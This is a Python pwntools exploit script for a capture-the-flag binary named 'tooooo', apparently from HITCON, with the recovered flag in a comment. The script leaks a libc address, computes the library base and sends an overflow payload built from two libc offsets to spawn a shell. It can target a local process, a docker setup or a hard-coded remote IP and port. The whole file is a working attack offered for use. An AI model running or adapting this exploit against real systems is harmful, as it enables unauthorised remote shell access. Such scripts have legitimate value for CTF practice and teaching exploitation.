from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./tooooo"
LIBC = "libc-2.27.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

# flag: hitcon{y0u_found_th3_m4g1c_in_gl1bc_4nd_g3t_th3_sh3ll}

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def exploit(conn, elf, libc, local):
    libcleak = int(conn.recvline().strip(), 16)
    libc.address = libcleak - libc.symbols['_IO_2_1_stdout_']
    log.info("%#x", libc.address)

    p = ""
    p += "A"*0x20
    p += p64(libc.address + 0x110700)
    p += p64(libc.address + 0x63E90)
    conn.sendline(p)

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("13.230.48.252", 4869)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
